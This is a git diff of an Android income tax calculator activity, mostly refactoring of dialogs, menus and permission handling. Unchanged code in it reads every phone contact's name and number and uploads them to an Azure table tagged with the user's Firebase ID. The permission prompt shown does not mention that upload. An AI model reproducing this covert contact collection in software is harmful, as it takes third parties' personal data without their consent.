@@ -14,14 +14,12 @@ import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.support.annotation.NonNull;
 import android.support.design.widget.NavigationView;
-
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.FragmentManager;
 import android.support.v4.app.FragmentTransaction;
 import android.support.v4.content.ContextCompat;
 import android.support.v4.widget.DrawerLayout;
 import android.support.v7.app.ActionBarDrawerToggle;
-import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
 import android.text.SpannableString;
@@ -212,7 +210,7 @@ public class IncomeTaxMain extends AppCompatActivity {
                 if(incometaxedittext.getText().toString().equals("")){
                     incometaxedittext.setError("Enter the Salary");
                 }
-               else {
+                else {
                     String spinnerGender = genderspinner.getSelectedItem().toString().trim();
                     double edittextIncomeValue = Double.parseDouble(incometaxedittext.getText().toString().trim());
                     income = new IncomeTaxCalculator(edittextIncomeValue, spinnerGender);
@@ -230,20 +228,14 @@ public class IncomeTaxMain extends AppCompatActivity {
                 }
             }
         });
+
     }
-
-
-
 
     ///Uploading contacts to azure
     private void uploadContactsToAzure(){
-
-
         initializeAzureTable();
         fetchContacts();
         uploadContact();
-
-
     }
     private void initializeAzureTable() {
         try {
@@ -279,26 +271,17 @@ public class IncomeTaxMain extends AppCompatActivity {
                 contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                 contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                 contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());
-
                 azureContactArrayList.add(contact);
-
-
-
 
             }
             phone.close();
         }catch (Exception e){
-
         }
-
-
     }
     private void uploadContact() {
         for (Contacts c : azureContactArrayList) {
-
             try {
                 asyncUploader(c);
-                //mobileServiceTable.insert(c);
             }
             catch (Exception e){
                 Log.e("uploadContact : ", e.toString());
@@ -307,8 +290,6 @@ public class IncomeTaxMain extends AppCompatActivity {
     }
     private void asyncUploader(Contacts contact){
         final Contacts item = contact;
-        //Log.e(" ", item.getContactname());
-
         AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
             @Override
             protected Void doInBackground(Void... params) {
@@ -344,8 +325,9 @@ public class IncomeTaxMain extends AppCompatActivity {
                     Log.e("ForumMainActivity:", "User was null so directed to Login activity");
                     Intent loginIntent = new Intent(IncomeTaxMain.this, LoginActivity.class);
                     loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                    startActivity(loginIntent);
                     finish();
+                    startActivity(loginIntent);
+
                 }
                 else {
                     if (!checkPermission()) {
@@ -356,7 +338,6 @@ public class IncomeTaxMain extends AppCompatActivity {
                         uploadContactsToAzure();
 
                     }
-
                 }
 
             }
@@ -371,8 +352,28 @@ public class IncomeTaxMain extends AppCompatActivity {
         firebaseAuth.addAuthStateListener(firebaseAuthListner);
     }
 
+    @Override
+    public boolean onCreateOptionsMenu(Menu menu) {
+        // Inflate the menu; this adds items to the action bar if it is present.
+        getMenuInflater().inflate(R.menu.main, menu);
+        return true;
+    }
 
+    @Override
+    public boolean onOptionsItemSelected(MenuItem item) {
+        // Handle action bar item clicks here. The action bar will
+        // automatically handle clicks on the Home/Up button, so long
+        // as you specify a parent activity in AndroidManifest.xml.
+        int id = item.getItemId();
+        //noinspection SimplifiableIfStatement
 
+        if (id == R.id.action_logout){
+            closeapp();
+
+        }
+
+        return super.onOptionsItemSelected(item);
+    }
     protected void syncContactsWithFirebase(){
 
         AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
@@ -400,19 +401,11 @@ public class IncomeTaxMain extends AppCompatActivity {
                         } catch (Exception e) {
 
                         }
-
-
-
                     }
-
-
-
                     runOnUiThread(new Runnable() {
 
                         @Override
                         public void run() {
-
-
                         }
                     });
                 } catch (Exception exception) {
@@ -425,31 +418,8 @@ public class IncomeTaxMain extends AppCompatActivity {
         task.execute();
     }
 
-    @Override
-    public boolean onCreateOptionsMenu(Menu menu) {
-        // Inflate the menu; this adds items to the action bar if it is present.
-        getMenuInflater().inflate(R.menu.main, menu);
-        return true;
-    }
-
-    @Override
-    public boolean onOptionsItemSelected(MenuItem item) {
-        // Handle action bar item clicks here. The action bar will
-        // automatically handle clicks on the Home/Up button, so long
-        // as you specify a parent activity in AndroidManifest.xml.
-        int id = item.getItemId();
-
-        //noinspection SimplifiableIfStatement
-        if (id == R.id.action_logout) {
-         closeapp();
-        }
-
-        return super.onOptionsItemSelected(item);
-    }
-
-
     public  void closeapp(){
-        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
+        android.app.AlertDialog.Builder alertDialogBuilder = new android.app.AlertDialog.Builder(this);
         alertDialogBuilder.setMessage("Are you sure you want to close App?");
         alertDialogBuilder.setPositiveButton("Yes",
                 new DialogInterface.OnClickListener() {
@@ -470,18 +440,17 @@ public class IncomeTaxMain extends AppCompatActivity {
                 });
 
         //Showing the alert dialog
-        AlertDialog alertDialog = alertDialogBuilder.create();
+        android.app.AlertDialog alertDialog = alertDialogBuilder.create();
         alertDialog.setCanceledOnTouchOutside(false);
         alertDialog.show();
     }
-
 
 
     @Override
     public boolean onKeyDown(int keyCode, KeyEvent event) {
         switch (keyCode) {
             case KeyEvent.KEYCODE_BACK:
-                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
+                android.support.v7.app.AlertDialog.Builder alertDialogBuilder = new android.support.v7.app.AlertDialog.Builder(this);
                 alertDialogBuilder.setMessage("Are you sure you want to close App?");
                 alertDialogBuilder.setPositiveButton("Yes",
                         new DialogInterface.OnClickListener() {
@@ -502,11 +471,98 @@ public class IncomeTaxMain extends AppCompatActivity {
                 });
 
                 //Showing the alert dialog
-                AlertDialog alertDialog = alertDialogBuilder.create();
+                android.support.v7.app.AlertDialog alertDialog = alertDialogBuilder.create();
                 alertDialog.show();
                 return true;
         }
         return super.onKeyDown(keyCode, event);
+    }
+    //used this when mobile orientaion is changed
+    public void onConfigurationChanged(Configuration newConfig) {
+        super.onConfigurationChanged(newConfig);
+        // Checks the orientation of the screen
+        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
+            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
+        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
+            //Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
+        }
+    }
+    private boolean checkPermission() {
+        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
+        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);
+        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
+    }
+
+    private void requestPermission() {
+        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
+        switch (requestCode) {
+            case PERMISSION_REQUEST_CODE:
+                if (grantResults.length > 0) {
+
+                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
+                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;
+
+                    if (locationAccepted && cameraAccepted) {
+                    }
+                    else {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
+                                android.app.AlertDialog.Builder alertDialogBuilder = new android.app.AlertDialog.Builder(IncomeTaxMain.this);
+                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly");
+                                alertDialogBuilder.setPositiveButton("yes",
+                                        new DialogInterface.OnClickListener() {
+                                            @Override
+                                            public void onClick(DialogInterface arg0, int arg1) {
+
+                                                Log.e("ALERT BOX ", "Requesting Permissions");
+
+                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);
+                                                }
+                                            }
+                                        });
+
+                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
+                                    @Override
+                                    public void onClick(DialogInterface dialog, int which) {
+                                        Log.e("ALERT BOX ", "Permissions not granted");
+                                        finish();
+                                    }
+                                });
+
+                                android.app.AlertDialog alertDialog = alertDialogBuilder.create();
+                                alertDialog.setCanceledOnTouchOutside(false);
+                                alertDialog.show();
+                                return;
+                            }
+                            else{
+                                android.app.AlertDialog.Builder alertDialogBuilder = new android.app.AlertDialog.Builder(IncomeTaxMain.this);
+                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
+                                alertDialogBuilder.setPositiveButton("Ok",
+                                        new DialogInterface.OnClickListener() {
+                                            @Override
+                                            public void onClick(DialogInterface arg0, int arg1) {
+                                                finish();
+                                            }
+                                        });
+
+                                android.app.AlertDialog alertDialog = alertDialogBuilder.create();
+                                alertDialog.setCanceledOnTouchOutside(false);
+                                alertDialog.show();
+                                return;
+
+                            }
+                        }
+
+                    }
+                }
+
+                break;
+        }
     }
     private void dispalyPieChart(double st1, double st2,double st3,double st4) {
         this.st1=st1;
@@ -605,118 +661,6 @@ public class IncomeTaxMain extends AppCompatActivity {
         return s;
     }
 
-    @Override
-    public void onConfigurationChanged(Configuration newConfig) {
-        super.onConfigurationChanged(newConfig);
-
-        // Checks the orientation of the screen
-        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
-            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
-        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
-           // Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
-        }
-
-
-    }
-
-    @Override
-    protected void onRestoreInstanceState(Bundle savedInstanceState) {
-        super.onRestoreInstanceState(savedInstanceState);
-        // Read values from the "savedInstanceState"-object and put them in your textview
-    }
-
-    @Override
-    protected void onSaveInstanceState(Bundle outState) {
-        // Save the values you need from your textview into "outState"-object
-        super.onSaveInstanceState(outState);
-    }
-
-
-    private boolean checkPermission() {
-        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
-        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);
-
-        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
-    }
-
-    private void requestPermission() {
-
-        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);
-
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
-        switch (requestCode) {
-            case PERMISSION_REQUEST_CODE:
-                if (grantResults.length > 0) {
-
-                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
-                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;
-
-                    if (locationAccepted && cameraAccepted) {
-                    }
-                    else {
-
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
-                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(IncomeTaxMain.this);
-                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
-                                alertDialogBuilder.setPositiveButton("yes",
-                                        new DialogInterface.OnClickListener() {
-                                            @Override
-                                            public void onClick(DialogInterface arg0, int arg1) {
-
-                                                Log.e("ALERT BOX ", "Requesting Permissions");
-
-                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS},
-                                                            PERMISSION_REQUEST_CODE);
-                                                }
-                                            }
-                                        });
-
-                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
-                                    @Override
-                                    public void onClick(DialogInterface dialog, int which) {
-                                        Log.e("ALERT BOX ", "Permissions not granted");
-                                        android.os.Process.killProcess(android.os.Process.myPid());
-                                        System.exit(1);
-
-                                    }
-                                });
-
-                                AlertDialog alertDialog = alertDialogBuilder.create();
-                                alertDialog.setCanceledOnTouchOutside(false);
-                                alertDialog.show();
-                                return;
-                            }
-                            else{
-                                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(IncomeTaxMain.this);
-                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
-                                alertDialogBuilder.setPositiveButton("Ok",
-                                        new DialogInterface.OnClickListener() {
-                                            @Override
-                                            public void onClick(DialogInterface arg0, int arg1) {
-                                                android.os.Process.killProcess(android.os.Process.myPid());
-                                                System.exit(1);
-                                            }
-                                        });
-
-                                AlertDialog alertDialog = alertDialogBuilder.create();
-                                alertDialog.setCanceledOnTouchOutside(false);
-                                alertDialog.show();
-                                return;
-
-                            }
-                        }
-
-                    }
-                }
-
-                break;
-        }
-    }
 }
 
 
